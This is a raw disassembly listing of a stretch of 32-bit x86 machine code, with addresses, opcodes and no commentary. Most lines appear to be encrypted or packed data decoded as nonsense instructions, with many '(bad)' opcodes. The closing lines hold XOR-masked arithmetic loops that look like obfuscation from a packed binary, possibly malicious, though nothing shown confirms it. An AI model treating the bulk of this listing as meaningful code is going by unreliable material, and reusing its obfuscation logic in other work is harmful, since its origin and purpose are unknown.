  40585d:	add    DWORD PTR [ecx+0x9],esp
  405860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405862:	movaps XMMWORD PTR [esi+0x55ce203d],xmm6
  405869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40586a:	not    BYTE PTR [eax]
  40586c:	inc    edi
  40586d:	fwait
  40586e:	sbb    ch,BYTE PTR [esi]
  405870:	rol    BYTE PTR [eax],0xf2
  405873:	jmp    0x7d06:0x429b29e8
  40587a:	xchg   ecx,eax
  40587b:	mov    eax,ds:0x364bcbe2
  405880:	xchg   esi,eax
  405881:	add    ah,BYTE PTR [esi]
  405883:	lods   eax,DWORD PTR ds:[esi]
  405884:	aad    0x1f
  405886:	push   0x7c
  405888:	dec    ecx
  405889:	mov    ebx,0x39853cad
  40588e:	nop
  40588f:	mov    ch,0x3
  405891:	aaa    
  405892:	adc    eax,0xcff97b72
  405897:	ret    0x916c
  40589a:	int    0xea
  40589c:	push   esp
  40589d:	nop
  40589e:	sub    eax,0xb13eb357
  4058a3:	xlat   BYTE PTR ds:[ebx]
  4058a4:	imul   edi,eax,0xffffffd5
  4058a7:	inc    ecx
  4058a8:	sbb    edx,DWORD PTR [eax+ebp*1-0x1948d23d]
  4058af:	call   DWORD PTR [esi]
  4058b1:	pop    eax
  4058b2:	cli    
  4058b3:	in     eax,dx
  4058b4:	sub    eax,0x405c6a16
  4058b9:	jnp    0x4058a5
  4058bb:	and    BYTE PTR [edi-0x10],al
  4058be:	pop    ebx
  4058bf:	repz shl DWORD PTR [esi+0x30],cl
  4058c3:	or     bl,bh
  4058c5:	mov    al,BYTE PTR [edx+0x75]
  4058c8:	cs push ebp
  4058ca:	xchg   edi,eax
  4058cb:	imul   edx,DWORD PTR [eax-0x484f79e4],0x36
  4058d2:	push   edx
  4058d3:	push   0x8014c9eb
  4058d8:	pop    edx
  4058d9:	sbb    bh,BYTE PTR [eax]
  4058db:	xor    DWORD PTR [ebp-0x22],ecx
  4058de:	push   ss
  4058df:	shl    ecx,1
  4058e1:	push   ss
  4058e2:	jno    0x405960
  4058e4:	stos   DWORD PTR es:[edi],eax
  4058e5:	ret    0x5206
  4058e8:	shl    BYTE PTR [edx],1
  4058ea:	jnp    0x405927
  4058ec:	popf   
  4058ed:	sub    ebp,eax
  4058ef:	or     al,0x4e
  4058f1:	imul   ecx,DWORD PTR [edx+edi*4-0x1a99aba6],0x4b
  4058f9:	jp     0x405938
  4058fb:	out    dx,al
  4058fc:	into   
  4058fd:	jns    0x4058c5
  4058ff:	jecxz  0x405945
  405901:	pop    edx
  405902:	or     DWORD PTR [ebp-0x7a],edi
  405905:	mov    dl,0x5c
  405907:	outs   dx,DWORD PTR ds:[esi]
  405908:	fs or  al,0x58
  40590b:	pop    eax
  40590c:	ja     0x405958
  40590e:	mov    ah,0x31
  405910:	push   0x70f5d4d7
  405915:	mov    al,ds:0x608289d3
  40591a:	les    esp,FWORD PTR [eax+0x2c]
  40591d:	sbb    al,0x7a
  40591f:	(bad)  
  405920:	rcl    BYTE PTR [eax+0x63864285],cl
  405926:	stc    
  405927:	adc    al,0xd8
  405929:	mov    eax,0xb951d85
  40592e:	pop    edx
  40592f:	cmc    
  405930:	iret   
  405931:	std    
  405932:	pop    ebx
  405933:	gs js  0x40599c
  405936:	push   ss
  405937:	ret    
  405938:	push   ss
  405939:	or     edi,DWORD PTR es:[edi]
  40593c:	mov    esp,0xfd5d3ada
  405941:	mov    edx,0x7006c25a
  405946:	test   eax,0x57aa9e71
  40594c:	fs ret 0x1c5d
  405950:	outs   dx,BYTE PTR ds:[esi]
  405951:	jecxz  0x4058f4
  405953:	pop    esi
  405954:	mov    DWORD PTR [edx],ebx
  405956:	test   al,0xb5
  405958:	jmp    0x40593a
  40595a:	(bad)
  40595e:	adc    DWORD PTR [ecx+0x3e],edi
  405961:	lods   al,BYTE PTR ds:[esi]
  405962:	or     eax,0x953cd543
  405967:	ss dec eax
  405969:	or     eax,DWORD PTR [ebx-0x46d8850e]
  40596f:	or     eax,0x749a6a7b
  405974:	jno    0x405935
  405976:	adc    edx,edx
  405978:	or     al,0xe7
  40597a:	or     DWORD PTR [eax-0x4c],edi
  40597d:	shl    DWORD PTR ds:0x8934c2af,cl
  405983:	repnz ins DWORD PTR es:[edi],dx
  405985:	xchg   esi,eax
  405986:	xchg   ecx,eax
  405987:	mov    ebx,0xd9b27f44
  40598c:	ds pop edx
  40598e:	ja     0x405a01
  405990:	dec    edx
  405991:	sbb    eax,0x7503f500
  405996:	sahf   
  405997:	add    DWORD PTR [edi+0x48],ebx
  40599a:	test   al,0xb0
  40599c:	lea    esi,[esi]
  40599e:	ret    
  40599f:	lea    ebx,[edx+esi*8+0x40c30674]
  4059a6:	jno    0x4059c4
  4059a8:	dec    edi
  4059a9:	pop    ss
  4059aa:	in     al,dx
  4059ab:	loope  0x4059f2
  4059ad:	or     DWORD PTR [edi-0x32],edi
  4059b0:	out    0xc3,al
  4059b2:	adc    bh,BYTE PTR [ecx+0x3a]
  4059b5:	dec    edx
  4059b6:	xor    al,0x50
  4059b8:	push   edi
  4059b9:	imul   ebx,eax,0xacfad21c
  4059bf:	mov    dh,0x4e
  4059c1:	mov    al,ds:0xc65d578c
  4059c6:	xor    edx,edx
  4059c8:	ret    0x3c92
  4059cb:	les    edi,FWORD PTR [edi-0x3d8a40e3]
  4059d1:	mov    edi,0x39caee49
  4059d6:	lea    eax,[ebp-0x15162e37]
  4059dc:	jo     0x40599d
  4059de:	(bad)  
  4059df:	div    BYTE PTR [ecx-0x34]
  4059e2:	push   ebp
  4059e3:	and    eax,0x9ffc3c1b
  4059e8:	inc    ebx
  4059e9:	xchg   esi,eax
  4059ea:	pop    ecx
  4059eb:	jb     0x4059c5
  4059ed:	out    0x53,al
  4059ef:	in     al,0x69
  4059f1:	das    
  4059f2:	ds addr16 nop
  4059f5:	push   ebp
  4059f6:	scas   eax,DWORD PTR es:[edi]
  4059f7:	sbb    eax,0x65760fc6
  4059fc:	dec    esi
  4059fd:	bound  ebx,QWORD PTR [ebx]
  4059ff:	imul   edx,DWORD PTR [eax-0x4b],0x4
  405a03:	test   BYTE PTR [ebp-0x5109ebac],bh
  405a09:	fst    st(1)
  405a0b:	pop    edi
  405a0c:	out    dx,eax
  405a0d:	xchg   edi,eax
  405a0e:	enter  0x4a94,0x13
  405a12:	or     DWORD PTR [esi],esi
  405a14:	xor    dl,al
  405a16:	(bad)  
  405a18:	into   
  405a19:	scas   eax,DWORD PTR es:[edi]
  405a1a:	imul   ebp,DWORD PTR ds:0x68fe13c4,0xffffffb0
  405a21:	neg    BYTE PTR [eax]
  405a23:	mov    es,edx
  405a25:	mov    ecx,0x4761c375
  405a2a:	repz test eax,0x5f2d40f1
  405a30:	xor    DWORD PTR [ecx-0x47],0x288b5d8d
  405a37:	mov    edi,esi
  405a39:	mov    ebp,0xd62106fb
  405a3e:	sub    BYTE PTR [edx-0x397d28c4],ch
  405a44:	xor    ecx,0xea67349
  405a4a:	out    0x47,eax
  405a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a4d:	xchg   esp,eax
  405a4e:	sbb    cl,BYTE PTR [ecx-0x48]
  405a51:	cmp    eax,0x677c16bc
  405a56:	fidivr DWORD PTR [ebx]
  405a58:	cli    
  405a59:	fistp  QWORD PTR [edi]
  405a5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a5c:	and    ah,bh
  405a5e:	mov    ah,0x87
  405a60:	xchg   ebx,eax
  405a61:	out    0xab,al
  405a63:	pop    edx
  405a64:	dec    edx
  405a65:	cmp    DWORD PTR [ecx-0x53c8350f],esi
  405a6b:	jo     0x405ab7
  405a6d:	jns    0x405a4c
  405a6f:	cmp    BYTE PTR [ebx-0x34380113],bh
  405a75:	ror    al,0xf1
  405a78:	fisubr WORD PTR [eax-0x1c3a3606]
  405a7e:	mov    es,WORD PTR [esi]
  405a80:	jl     0x405a66
  405a82:	cmp    esi,DWORD PTR [eax+0x17]
  405a85:	push   ss
  405a86:	adc    BYTE PTR [ebx-0x4ce130cc],cl
  405a8c:	push   esp
  405a8d:	pop    es
  405a8e:	jge    0x405ad9
  405a90:	nop
  405a91:	gs pop es
  405a93:	das    
  405a94:	(bad)  
  405a96:	stos   DWORD PTR es:[edi],eax
  405a97:	mov    ds:0xf6efb445,al
  405a9c:	cmp    BYTE PTR [esi-0x7e768bc2],0xba
  405aa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405aa4:	test   DWORD PTR [ebp-0x14d37c6a],eax
  405aaa:	pop    ebx
  405aab:	push   ecx
  405aac:	idiv   BYTE PTR [ebx]
  405aae:	xchg   ebp,eax
  405aaf:	mov    edi,0x28a00711
  405ab4:	fbld   TBYTE PTR [edx-0x29]
  405ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ab8:	xor    al,0x7a
  405aba:	adc    edi,0x5514ddeb
  405ac0:	sub    eax,0x2592e096
  405ac5:	bnd jbe 0x405b07
  405ac8:	int    0x11
  405aca:	or     eax,0x447f2103
  405acf:	test   BYTE PTR [eax*2+0x4fc61e4],bl
  405ad6:	std    
  405ad7:	test   DWORD PTR [esi],esi
  405ad9:	ss jmp 0x9b99:0xecd70dd7
  405ae1:	inc    ecx
  405ae2:	inc    eax
  405ae3:	xlat   BYTE PTR ds:[ebx]
  405ae4:	xchg   ecx,eax
  405ae5:	inc    edi
  405ae6:	mov    cl,0x37
  405ae8:	ficom  WORD PTR [esp+ebx*4]
  405aeb:	lods   eax,DWORD PTR ds:[esi]
  405aec:	push   ebp
  405aed:	push   edx
  405aee:	mul    BYTE PTR [edi-0x17]
  405af1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405af2:	jl     0x405aaa
  405af4:	add    al,0x86
  405af6:	xchg   edx,eax
  405af7:	or     eax,0xbc75f69c
  405afc:	pop    esp
  405afd:	ja     0x405af1
  405aff:	test   ebx,0xdec848ff
  405b05:	je     0x405aec
  405b07:	shr    DWORD PTR [ebp+esi*1-0x207e3c41],cl
  405b0e:	loopne 0x405aaa
  405b10:	(bad)  
  405b11:	lods   al,BYTE PTR ds:[esi]
  405b12:	inc    edi
  405b13:	push   ecx
  405b14:	mov    dh,0xae
  405b16:	daa    
  405b17:	sbb    DWORD PTR fs:[ecx+0x68155d7b],ebx
  405b1e:	jmp    0x968226e6
  405b23:	dec    esp
  405b24:	aad    0x52
  405b26:	inc    esp
  405b27:	pop    ss
  405b28:	cmc    
  405b29:	mov    eax,ds:0x4119693c
  405b2e:	(bad)  
  405b2f:	mov    eax,ds:0x4ff50c24
  405b34:	jno    0x405b48
  405b36:	call   0x6826:0xda3ce80c
  405b3d:	rcr    edx,0xe8
  405b40:	or     DWORD PTR [edx+0x35],eax
  405b43:	ja     0x405b37
  405b45:	jmp    0xf7319688
  405b4a:	xor    BYTE PTR ds:0x8ae39d18,ah
  405b50:	into   
  405b51:	aam    0x23
  405b53:	mov    bh,0xab
  405b55:	out    dx,al
  405b56:	jne    0x405afe
  405b58:	push   esi
  405b59:	test   al,0x6e
  405b5b:	loopne 0x405afc
  405b5d:	cmp    dl,ch
  405b5f:	fwait
  405b60:	lahf   
  405b61:	in     al,0x22
  405b63:	xor    al,0xa
  405b65:	inc    ebp
  405b66:	inc    eax
  405b67:	popf   
  405b68:	das    
  405b69:	xor    al,0x3e
  405b6b:	sahf   
  405b6c:	scas   al,BYTE PTR es:[edi]
  405b6d:	push   eax
  405b6e:	cdq    
  405b6f:	sbb    al,0xcb
  405b71:	xchg   BYTE PTR [esi-0xe],al
  405b74:	mov    es,WORD PTR [ecx+0x79]
  405b77:	aaa    
  405b78:	cmc    
  405b79:	push   edi
  405b7a:	mov    ds:0x985349fb,al
  405b7f:	ret    0x47fb
  405b82:	fldcw  WORD PTR [edi]
  405b84:	ins    BYTE PTR es:[edi],dx
  405b85:	sahf   
  405b86:	jecxz  0x405b1a
  405b88:	repnz sub BYTE PTR [edx+edx*4+0x60],ah
  405b8d:	sub    eax,0x2b92f5c4
  405b92:	mov    al,0xdb
  405b94:	xchg   esp,eax
  405b95:	or     BYTE PTR [ebx-0x668dcedf],0xb9
  405b9c:	sar    BYTE PTR ds:0x7cdb3d6c,0xa0
  405ba3:	sbb    BYTE PTR [esi+esi*4],ch
  405ba6:	(bad)  
  405ba7:	mov    eax,0x53c422a5
  405bac:	and    BYTE PTR [edi],0xa6
  405baf:	pusha  
  405bb0:	and    eax,0xc5cef532
  405bb5:	popa   
  405bb6:	adc    BYTE PTR ds:[eax-0xa],al
  405bba:	or     BYTE PTR [esi-0x77],0xe2
  405bbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bbf:	mov    BYTE PTR [ecx+0x6ca9e6af],dl
  405bc5:	push   0x8f2d64e8
  405bca:	pop    ebp
  405bcb:	outs   dx,BYTE PTR ds:[esi]
  405bcc:	push   ds
  405bcd:	popf   
  405bce:	dec    ecx
  405bcf:	nop
  405bd0:	data16 aam 0x93
  405bd3:	dec    ebx
  405bd4:	jge    0x405c0f
  405bd6:	jl     0x405bc7
  405bd8:	jge    0x405c04
  405bda:	mov    edi,0xb8d269d9
  405bdf:	fadd   st,st(4)
  405be1:	lock pop eax
  405be3:	shl    ah,cl
  405be5:	retf   
  405be6:	ja     0x405be2
  405be8:	ds pop esi
  405bea:	mov    al,0xfa
  405bec:	sub    al,0x32
  405bee:	hlt    
  405bef:	mov    al,ds:0x7e1b316b
  405bf4:	mov    esi,0x8f707a2b
  405bf9:	add    BYTE PTR [esi],al
  405bfb:	sahf   
  405bfc:	inc    esi
  405bfd:	jmp    0xfae8a677
  405c02:	fnstsw WORD PTR [edx+0x4a03fbe1]
  405c08:	and    edx,0xffffffaa
  405c0b:	cmp    al,0x5
  405c0d:	in     eax,dx
  405c0e:	xor    edx,0xf451b71c
  405c14:	adc    ch,BYTE PTR [ebp-0x5b]
  405c17:	mov    al,ds:0x8157e786
  405c1c:	dec    ebp
  405c1d:	pop    ebx
  405c1e:	mov    eax,0x5ec1d896
  405c23:	mov    eax,0xe5da354b
  405c28:	and    BYTE PTR [ecx+0x23],cl
  405c2b:	rcl    BYTE PTR [ebp+0x74],1
  405c2e:	lods   al,BYTE PTR ds:[esi]
  405c2f:	mov    ebp,0x6b71d449
  405c34:	imul   ebx,esp,0xffffffdd
  405c37:	js     0x405c1f
  405c39:	popa   
  405c3a:	xchg   ecx,eax
  405c3b:	lods   eax,DWORD PTR ds:[esi]
  405c3c:	jmp    0x4284:0xc24f
  405c42:	xchg   dl,dl
  405c44:	mov    DWORD PTR [ebp+0x65fe87d8],edx
  405c4a:	int3   
  405c4b:	add    DWORD PTR [ebx-0x6b],eax
  405c4e:	retf   
  405c4f:	lahf   
  405c50:	mov    ds:0x6cf63067,al
  405c55:	or     bl,bl
  405c57:	call   0x8c2f:0xbaf0673b
  405c5e:	sub    eax,DWORD PTR [eax]
  405c60:	int3   
  405c61:	cmp    DWORD PTR [eax+0x3c],esi
  405c64:	fxch   st(3)
  405c66:	xchg   esi,eax
  405c67:	xor    DWORD PTR [edi-0x34],edi
  405c6a:	xchg   edi,eax
  405c6b:	cs ss mov ebp,0x23f3d399
  405c72:	push   ebp
  405c73:	xchg   ebp,eax
  405c74:	gs stos DWORD PTR es:[edi],eax
  405c76:	dec    edi
  405c77:	ja     0x405cca
  405c79:	jge    0x405c3c
  405c7b:	xchg   ebp,eax
  405c7c:	aaa    
  405c7d:	ret    0x3cac
  405c80:	int    0xf
  405c82:	jae    0x405ce7
  405c84:	jmp    0x405c90
  405c86:	xchg   ebp,eax
  405c87:	hlt    
  405c88:	adc    ebx,DWORD PTR [edx]
  405c8a:	push   es
  405c8b:	fs in  eax,dx
  405c8d:	jl     0x405c7a
  405c8f:	sti    
  405c90:	mov    eax,ds:0xdd0a017c
  405c95:	add    eax,0x8508ac36
  405c9a:	mov    dh,0xe1
  405c9c:	cmp    DWORD PTR [edx-0x29],0x8fd4eb0f
  405ca3:	mov    ecx,0xd199236
  405ca8:	test   al,0x4e
  405caa:	adc    al,0xf
  405cac:	cmc    
  405cad:	sbb    edx,ecx
  405caf:	xor    ah,BYTE PTR [esi+ecx*8-0x66]
  405cb3:	stos   DWORD PTR es:[edi],eax
  405cb4:	add    al,0x13
  405cb6:	ins    BYTE PTR es:[edi],dx
  405cb7:	sub    ah,bl
  405cb9:	cwde   
  405cba:	push   ss
  405cbb:	jno    0x405d20
  405cbd:	dec    esp
  405cbe:	or     BYTE PTR [esi+0x60],al
  405cc1:	repnz add al,0xcc
  405cc4:	in     al,0x35
  405cc6:	inc    ebp
  405cc7:	pop    edi
  405cc8:	inc    esp
  405cc9:	int3   
  405cca:	es (bad) 
  405ccd:	outs   dx,DWORD PTR ds:[esi]
  405cce:	sbb    eax,0x31edb49
  405cd3:	in     eax,0x56
  405cd5:	xchg   edi,eax
  405cd6:	sbb    eax,DWORD PTR [ecx-0x4566676f]
  405cdc:	and    BYTE PTR [edx+0x11],ch
  405cdf:	mov    bl,0x6b
  405ce1:	push   cs
  405ce2:	ret    0xf3b2
  405ce5:	in     eax,dx
  405ce6:	test   DWORD PTR [ebx+0x4e2c8b44],eax
  405cec:	pop    esp
  405ced:	cdq    
  405cee:	push   edx
  405cef:	xor    al,0x77
  405cf1:	lea    edi,[esi]
  405cf3:	xlat   BYTE PTR ds:[ebx]
  405cf4:	mov    ebp,0xab634c24
  405cf9:	mov    fs,WORD PTR ds:0x634eb3f0
  405cff:	dec    edi
  405d00:	xor    dh,BYTE PTR [ebx]
  405d02:	addr16 jl 0x405d3b
  405d05:	(bad)
  405d08:	jns    0x405ca5
  405d0a:	dec    esi
  405d0b:	mov    al,ds:0xf2cad1d3
  405d10:	aad    0x6a
  405d12:	imul   ebp,DWORD PTR [eax-0x71],0xffa3dd68
  405d19:	xlat   BYTE PTR ds:[ebx]
  405d1a:	mov    ds,WORD PTR [esp+ebx*2-0x25]
  405d1e:	les    ecx,FWORD PTR [esi+0x5e]
  405d21:	xchg   DWORD PTR [edx],ebx
  405d23:	adc    cl,BYTE PTR [ebx-0x49]
  405d26:	pop    ds
  405d27:	js     0x405da6
  405d29:	mov    ds:0xe7520f18,eax
  405d2e:	scas   al,BYTE PTR es:[edi]
  405d2f:	dec    esp
  405d30:	iret   
  405d31:	adc    al,0xdc
  405d33:	jb     0x405cd6
  405d35:	cmp    esi,DWORD PTR [ecx-0x3cb2ec44]
  405d3b:	and    BYTE PTR [eax+0x4f2e1841],al
  405d41:	or     al,0x4c
  405d43:	test   BYTE PTR [ecx+edi*2],bl
  405d46:	or     ch,BYTE PTR [eax+0x72]
  405d49:	inc    ebp
  405d4a:	jo     0x405d7d
  405d4c:	cld    
  405d4d:	jns    0x405d9d
  405d4f:	(bad)  
  405d50:	out    dx,al
  405d51:	ror    DWORD PTR [ecx+0x2d],0xde
  405d55:	pusha  
  405d56:	sbb    BYTE PTR [ebp+0x52],al
  405d59:	jp     0x405ce6
  405d5b:	jmp    0xa712:0x8eda7cd8
  405d62:	loope  0x405d0d
  405d64:	outs   dx,BYTE PTR ds:[esi]
  405d65:	mov    edx,0xf69583b9
  405d6a:	or     DWORD PTR [edx-0x2b],ebx
  405d6d:	cmp    al,BYTE PTR [esi]
  405d6f:	jbe    0x405cfe
  405d71:	sahf   
  405d72:	cmp    dh,0x23
  405d75:	mov    ah,0x60
  405d77:	add    edi,edx
  405d79:	mov    ebp,gs
  405d7b:	(bad)  [eax-0x3bbdd9c9]
  405d81:	xchg   DWORD PTR [edx],edi
  405d83:	sub    BYTE PTR [esi+eiz*8-0x7b],ah
  405d87:	call   0x9ab3b89a
  405d8c:	(bad)  
  405d8d:	(bad)  
  405d8f:	dec    eax
  405d90:	jmp    FWORD PTR [ebx-0x4c5ff8e4]
  405d96:	dec    edx
  405d97:	xchg   ebx,eax
  405d98:	or     bh,BYTE PTR [ebp+edi*2+0x54c646bb]
  405d9f:	call   0xe0632822
  405da4:	imul   ebx,DWORD PTR [ecx-0x6b52f698],0xffffff84
  405dab:	push   cs
  405dac:	test   al,0x54
  405dae:	pusha  
  405daf:	inc    esi
  405db1:	sub    eax,0xc2a96ed5
  405db6:	out    dx,eax
  405db7:	xor    BYTE PTR [esi],0xe
  405dba:	shr    edx,cl
  405dbc:	retf   0xc8a7
  405dbf:	mov    bl,0x62
  405dc1:	out    0xb8,eax
  405dc3:	mov    al,ds:0x413c47db
  405dc8:	sbb    al,0x64
  405dca:	or     BYTE PTR [eax-0x4d],bh
  405dcd:	mov    eax,ds:0xe624c73
  405dd2:	(bad)  
  405dd3:	xor    BYTE PTR [ebx+0x63],bl
  405dd6:	xor    ah,ch
  405dd8:	dec    edx
  405dd9:	test   DWORD PTR [edi],esp
  405ddb:	fs clc 
  405ddd:	lods   al,BYTE PTR ds:[esi]
  405dde:	xchg   ebx,eax
  405ddf:	hlt    
  405de0:	pop    ss
  405de1:	ror    DWORD PTR fs:[ebp+edi*8-0x27],cl
  405de6:	push   esi
  405de7:	pop    esi
  405de8:	mov    ah,cl
  405dea:	mov    ch,0x6a
  405dec:	loop   0x405d82
  405dee:	and    ebp,DWORD PTR [edx-0x370d6aaa]
  405df4:	sbb    BYTE PTR [edi-0x14],dh
  405df7:	jl     0x405db9
  405df9:	dec    esp
  405dfa:	pop    esp
  405dfb:	add    BYTE PTR [ecx-0x16],cl
  405dfe:	ror    DWORD PTR [eiz*1+0x74356a39],0x0
  405e06:	mov    ch,0xf4
  405e08:	cmp    DWORD PTR [esp+edx*1],esi
  405e0b:	mov    ebp,0x2d5ca275
  405e10:	std    
  405e11:	je     0x405db5
  405e13:	adc    dh,BYTE PTR [ebp+0x74]
  405e16:	das    
  405e17:	xor    dh,al
  405e19:	mov    bl,0xa3
  405e1b:	repz (bad) 
  405e1d:	sti    
  405e1e:	jns    0x405e78
  405e20:	and    eax,0xed98741c
  405e25:	add    DWORD PTR [ebx+ebx*2+0x5caa22c4],ebx
  405e2c:	scas   al,BYTE PTR es:[edi]
  405e2d:	cmp    ebx,0x37
  405e30:	xchg   edx,eax
  405e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e32:	call   0xb9b391a5
  405e37:	outs   dx,BYTE PTR ds:[esi]
  405e38:	cmp    al,0x1a
  405e3a:	(bad)  
  405e3b:	ja     0x405e8c
  405e3d:	neg    DWORD PTR [eax-0x53eb52e]
  405e43:	test   BYTE PTR [ebp-0x25],dh
  405e46:	aad    0xea
  405e48:	inc    edx
  405e49:	add    al,0x22
  405e4b:	ins    DWORD PTR es:[edi],dx
  405e4c:	sbb    eax,0x8d582336
  405e51:	rol    DWORD PTR [edi+edx*8],0x8c
  405e55:	and    eax,0x5891f74b
  405e5a:	in     eax,0xaf
  405e5c:	pop    eax
  405e5d:	popa   
  405e5e:	aaa    
  405e5f:	push   cs
  405e60:	shr    DWORD PTR [esi],cl
  405e62:	addr16 mov dh,0xc0
  405e65:	js     0x405e1c
  405e67:	dec    eax
  405e68:	outs   dx,BYTE PTR ds:[esi]
  405e69:	repnz sub al,0x52
  405e6c:	push   edx
  405e6d:	outs   dx,BYTE PTR ds:[esi]
  405e6e:	jo     0x405e2c
  405e70:	xchg   ebx,eax
  405e71:	sbb    eax,ebx
  405e73:	and    BYTE PTR [edx+0x3eeb5759],ah
  405e79:	scas   al,BYTE PTR es:[edi]
  405e7a:	(bad)  
  405e7b:	fsubr  DWORD PTR [ebp-0x98deced]
  405e81:	xchg   esp,eax
  405e82:	adc    DWORD PTR [ebp-0x1d51d00d],eax
  405e88:	xchg   ebx,eax
  405e89:	cmp    al,BYTE PTR [ecx+0x14a54a8b]
  405e8f:	test   eax,0xf1699706
  405e94:	mov    bh,0x95
  405e96:	cmp    ecx,DWORD PTR [eax]
  405e98:	sbb    al,0xb0
  405e9a:	and    bh,BYTE PTR [ebp+0x70]
  405e9d:	or     dl,bh
  405e9f:	pop    es
  405ea0:	push   es
  405ea1:	cdq    
  405ea2:	jge    0x405e3f
  405ea4:	push   esp
  405ea5:	rcl    ecx,cl
  405ea7:	pop    esp
  405ea8:	dec    DWORD PTR [ecx-0x278b13d1]
  405eae:	inc    edi
  405eaf:	(bad)  
  405eb0:	mov    ah,0x51
  405eb2:	mov    ebx,DWORD PTR [edx-0x5d]
  405eb5:	xchg   edx,eax
  405eb6:	adc    eax,0xbc1bbc61
  405ebb:	pop    ecx
  405ebc:	inc    edx
  405ebd:	or     edx,DWORD PTR [esi]
  405ebf:	adc    al,0x8f
  405ec1:	fmul   DWORD PTR [eax]
  405ec3:	cdq    
  405ec4:	std    
  405ec5:	fiadd  WORD PTR [ecx+0x3447dfb3]
  405ecb:	inc    esp
  405ecc:	push   eax
  405ecd:	sti    
  405ece:	mov    al,0xa0
  405ed0:	cmp    dl,BYTE PTR [ecx]
  405ed2:	ret    0xf203
  405ed5:	mov    ebx,0x9e9515ce
  405eda:	xchg   edi,eax
  405edb:	sbb    esp,ebp
  405edd:	inc    edx
  405ede:	mov    es:0xde063d28,eax
  405ee4:	cmp    BYTE PTR [edx+0x70],cl
  405ee7:	ret    
  405ee8:	test   BYTE PTR [eax+0x16],al
  405eeb:	push   es
  405eec:	aad    0x63
  405eee:	jecxz  0x405f19
  405ef0:	(bad)
  405ef4:	add    BYTE PTR [edx],bh
  405ef6:	xchg   DWORD PTR [esi+ecx*2-0x228317a1],edx
  405efd:	cld    
  405efe:	add    edx,edx
  405f00:	loop   0x405ee2
  405f02:	jo     0x405e9e
  405f04:	aaa    
  405f05:	mov    ah,BYTE PTR [esi]
  405f07:	scas   al,BYTE PTR es:[edi]
  405f08:	out    0x94,al
  405f0a:	xchg   edi,eax
  405f0b:	jb     0x405f67
  405f0d:	into   
  405f0e:	dec    eax
  405f0f:	imul   esp,DWORD PTR [esi-0x51],0x29
  405f13:	imul   ecx,DWORD PTR ds:[eax+eax*8+0x11],0x36
  405f19:	ror    BYTE PTR [edx+0x25451ff9],0xba
  405f20:	ds mov bh,0xc0
  405f23:	or     eax,0x7a491d4d
  405f28:	rcr    esp,cl
  405f2a:	mov    ds:0xbdef020c,al
  405f2f:	mov    ebx,0x3308558b
  405f34:	rol    BYTE PTR [ecx-0x1],1
  405f37:	inc    ebp
  405f38:	call   0xca7c3540
  405f3d:	jb     0x403b83
  405f43:	jmp    0x405f8d
  405f48:	mov    ecx,DWORD PTR [ebp-0xc]
  405f4b:	mov    DWORD PTR [ebp+0x8],ecx
  405f4e:	jmp    0x405f80
  405f53:	mov    ecx,DWORD PTR [ebp+0x8]
  405f56:	mov    edx,DWORD PTR [ebp-0x8]
  405f59:	xor    ecx,eax
  405f5b:	xor    edx,eax
  405f5d:	sub    ecx,edx
  405f5f:	sub    ecx,esi
  405f61:	xor    ecx,eax
  405f63:	mov    DWORD PTR [ebp+0x8],ecx
  405f66:	mov    ecx,DWORD PTR [ebp+0x8]
  405f69:	mov    edx,DWORD PTR [ebp+0x8]
  405f6c:	imul   edx,edx,0x5708f5
  405f72:	xor    ecx,eax
  405f74:	add    ecx,esi
  405f76:	lea    ecx,[ebp+ecx*4-0x64]
  405f7a:	mov    edi,DWORD PTR [ecx]
  405f7c:	add    edx,edi
  405f7e:	mov    DWORD PTR [ecx],edx
  405f80:	mov    ecx,DWORD PTR [ebp+0x8]
  405f83:	xor    ecx,eax
  405f85:	add    ecx,esi
  405f87:	jne    0x405f53
  405f8d:	mov    ecx,DWORD PTR [ebp-0xc]
  405f90:	mov    DWORD PTR [ebp+0x8],ecx
  405f93:	jmp    0x405fc5
  405f98:	mov    ecx,DWORD PTR [ebp+0x8]
  405f9b:	mov    edx,DWORD PTR [ebp-0x8]
  405f9e:	xor    ecx,eax
  405fa0:	xor    edx,eax
  405fa2:	sub    ecx,edx
  405fa4:	sub    ecx,esi
  405fa6:	xor    ecx,eax
  405fa8:	mov    DWORD PTR [ebp+0x8],ecx
  405fab:	mov    ecx,DWORD PTR [ebp+0x8]
  405fae:	mov    edx,DWORD PTR [ebp+0x8]
  405fb1:	imul   edx,edx,0x5708f5
  405fb7:	xor    ecx,eax
  405fb9:	add    ecx,esi
  405fbb:	lea    ecx,[ebp+ecx*4-0x64]
  405fbf:	mov    edi,DWORD PTR [ecx]
  405fc1:	add    edx,edi
  405fc3:	mov    DWORD PTR [ecx],edx
  405fc5:	mov    ecx,DWORD PTR [ebp+0x8]
  405fc8:	xor    ecx,eax
  405fca:	add    ecx,esi
  405fcc:	jne    0x405f98
  405fd2:	mov    ecx,DWORD PTR [ebp-0x8]
  405fd5:	mov    edx,DWORD PTR [ebp-0x20]
  405fd8:	xor    ecx,eax
  405fda:	lea    ecx,[ecx+edx*1+0x3272db]
  405fe1:	mov    DWORD PTR [ebp-0x20],ecx
  405fe4:	inc    DWORD PTR [ebp+0xc]
  405fe7:	mov    ecx,DWORD PTR [ebp-0x1c]
  405fea:	xor    ecx,eax
  405fec:	add    ecx,esi
  405fee:	jne    0x401627
  405ff4:	jmp    0x40607d
  405ff9:	mov    ecx,DWORD PTR [ebp-0xc]
  405ffc:	mov    DWORD PTR [ebp+0x8],ecx
  405fff:	jmp    0x406031
  406004:	mov    ecx,DWORD PTR [ebp+0x8]
  406007:	mov    edx,DWORD PTR [ebp-0x8]
  40600a:	xor    ecx,eax
  40600c:	xor    edx,eax
  40600e:	sub    ecx,edx
  406010:	sub    ecx,esi
  406012:	xor    ecx,eax
  406014:	mov    DWORD PTR [ebp+0x8],ecx
  406017:	mov    ecx,DWORD PTR [ebp+0x8]
  40601a:	mov    edx,DWORD PTR [ebp+0x8]
  40601d:	imul   edx,edx,0x5708f5
  406023:	xor    ecx,eax
